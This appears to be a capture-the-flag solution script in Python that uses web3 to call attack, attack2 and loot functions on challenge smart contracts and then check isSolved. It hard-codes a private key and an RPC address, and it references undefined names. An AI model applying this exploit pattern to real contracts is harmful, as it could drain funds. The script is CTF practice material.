from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy


x = {
    "PrivateKey": "0xeae38bb2bebe1cb2f87bc971f3c4f28d0675a85d4a40a745eeea8091ed31e60b",
    "Address": "0x1381875734c09Efe644DfdC6E43eDBfb6DbA5815",
    "TargetAddress": "0x081C5aF8B8BF9810Fe2AD53aaA4101aeeE15D042",
    "setupAddress": "0xd8D835ea5B7d706CC37e769912B44a38ECE6B968"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

url = 'http://209.97.176.174:30060/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
block = web3.eth.getBlock(block_number)
print(block.timestamp)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

'''
#solcjs --abi --bin Setup.sol #generate .abi .bin
#with open('Setup_sol_Setup.abi','r') as f:
#       abi = json.load(f)

#contract_instance = w3.eth.contract(address=SetupContract, abi=abi)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

#construct_txn = contract_instance.constructor().buildTransaction(
#       {
#               'from': account_from['address'],
#               'nonce': w3.eth.get_transaction_count(account_from['address']),
#	       'value': 1
#       }
#)

#tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
#tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
#tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

with open('Creature_sol_Creature.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
construct_txn = contract_instance2.functions.attack(1000).build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                'chainId': w3.eth.chain_id,
		#'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

with open('Contract_sol_Contract.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
construct_txn = contract_instance2.functions.attack2().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
		#'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

with open('Creature_sol_Creature.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
construct_txn = contract_instance2.functions.loot().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                'chainId': w3.eth.chain_id,
                #'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


with open('Setup_sol_Setup.abi','r') as f:
        abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')
'''
